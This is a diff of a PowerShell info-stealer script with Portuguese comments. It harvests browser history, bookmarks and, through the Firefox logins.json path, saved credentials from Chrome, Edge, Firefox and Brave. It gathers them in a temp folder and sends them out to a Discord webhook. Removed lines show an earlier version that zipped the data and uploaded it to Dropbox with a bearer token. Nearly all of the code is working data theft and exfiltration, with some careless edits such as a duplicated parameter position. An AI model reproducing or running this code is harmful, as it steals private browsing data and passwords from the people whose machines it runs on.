@@ -480,13 +480,15 @@ $output > $env:TEMP\$FolderName/computerData.txt
 ############################################################################################################################################################
 # Dados dos Browsers
 # Função para extrair dados do histórico e favoritos dos navegadores
+############################################################################################################################################################
+# Dados dos Browsers
 function Get-BrowserData {
     [CmdletBinding()]
     param (	
         [Parameter(Position=1, Mandatory = $True)]
         [string]$Browser,
         
-        [Parameter(Position=2, Mandatory = $True)]
+        [Parameter(Position=1, Mandatory = $True)]
         [string]$DataType 
     ) 
 
@@ -494,25 +496,15 @@ function Get-BrowserData {
 
     $Path = ""
 
-    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {
-        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
-    }
-    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {
-        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
-    }
-    elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
-        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
-    }
-    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
-        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Favorites"
-    }
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
-        $Path = "$Env:APPDATA\Mozilla\Firefox\Profiles\*.default-release-*\places.sqlite"
-    }
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'bookmarks') {
-        $Path = "$Env:APPDATA\Mozilla\Firefox\Profiles\*.default-release-*\bookmarks.html"
-    }
-
+    if ($Browser -eq 'chrome' -and $DataType -eq 'history')   { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
+    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
+    elseif ($Browser -eq 'edge' -and $DataType -eq 'history')     { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data\Default\History" }
+    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks')   { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data\Default\Favorites" }
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history')  { $Path = "$Env:APPDATA\Mozilla\Firefox\Profiles\*.default-release-*\places.sqlite" }
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'bookmarks'){ $Path = "$Env:APPDATA\Mozilla\Firefox\Profiles\*.default-release-*\logins.json" }
+    elseif ($Browser -eq 'brave' -and $DataType -eq 'history')    { $Path = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History" }
+    elseif ($Browser -eq 'brave' -and $DataType -eq 'bookmarks')  { $Path = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks" }
+    
     if ($Path -ne "") {
         $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
         $Value | ForEach-Object {
@@ -530,33 +522,14 @@ function Get-BrowserData {
 }
 
 # Extrair dados do histórico e favoritos dos navegadores
-Get-BrowserData -Browser "chrome" -DataType "history"
-Get-BrowserData -Browser "chrome" -DataType "bookmarks"
-Get-BrowserData -Browser "edge" -DataType "history"
-Get-BrowserData -Browser "edge" -DataType "bookmarks"
-Get-BrowserData -Browser "firefox" -DataType "history"
-Get-BrowserData -Browser "firefox" -DataType "bookmarks"
-
-
-############################################################################################################################################################
-
-Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
-
-# Upload para a Dropbox
-
-function dropbox {
-$TargetFilePath="/$ZIP"
-$SourceFilePath="$env:TEMP\$ZIP"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){dropbox}
+Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "firefox" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "brave" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
 
 ############################################################################################################################################################
 
@@ -579,15 +552,12 @@ $Body = @{
 }
 
 if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)}
 
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+if (-not ([string]::IsNullOrEmpty($file))){Invoke-RestMethod -Uri $hookurl -Method Post -InFile $file -ContentType "multipart/form-data"}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
-
-# Remover o arquivo "Perfil_Firefox.rar" após o envio
-Remove-Item "$env:TEMP\Perfil_Firefox.rar" -Force -ErrorAction SilentlyContinue
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TMP\$FolderName\BrowserData.txt"}
 
 ############################################################################################################################################################
 
